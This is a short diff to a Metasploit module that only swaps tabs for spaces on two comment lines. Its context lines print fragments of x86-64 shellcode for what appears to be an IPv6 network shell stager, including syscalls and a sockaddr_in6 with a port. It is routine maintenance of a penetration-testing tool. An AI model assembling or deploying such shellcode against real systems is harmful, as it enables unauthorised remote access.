@@ -53,7 +53,7 @@ module Metasploit3
             "\x04\x58"             +#   add    $0x58,%al                   #
             "\x0f\x05"             +#   syscall                            #
             "\xe9\x23\x00\x00\x00" +#   jmpq   <forth>                     #
-	    # back:
+            # back:
             "\x5e"                 +#   pop    %rsi                        #
             "\x6a\x1c"             +#   pushq  $0x1c                       #
             "\x5a"                 +#  	pop    %rdx                        #
@@ -72,7 +72,7 @@ module Metasploit3
             "\x0f\x05"             +# 	syscall                            #
             # forth:
             "\xe8\xd8\xff\xff\xff" +#   callq <back>                       #
-	    # sockaddr_in6
+            # sockaddr_in6
             "\x00\x1c\x11\x5c"     +#   AF_INET6+port                      #
             "\x00\x00\x00\x00"     +#   no-one-cares                       #
             "\x00\x00\x00\x00"     +#   IPv6-                              #
